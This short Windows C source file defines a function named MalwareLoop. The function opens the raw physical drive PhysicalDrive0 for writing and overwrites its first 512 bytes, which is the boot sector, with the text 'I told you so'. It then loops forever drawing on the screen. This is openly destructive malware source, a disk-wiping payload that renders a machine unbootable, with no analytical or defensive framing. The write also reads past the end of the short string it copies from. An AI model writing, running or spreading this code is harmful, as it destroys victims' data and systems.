#include "loop.h"






VOID MalwareLoop(){
    HANDLE hFile = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hFile, "I told you so", 512, NULL, NULL);
    HDC dc = GetDC(NULL);
    while(1){
        PatBlt(dc, 10, 10, 90, 90, 0);
    }
}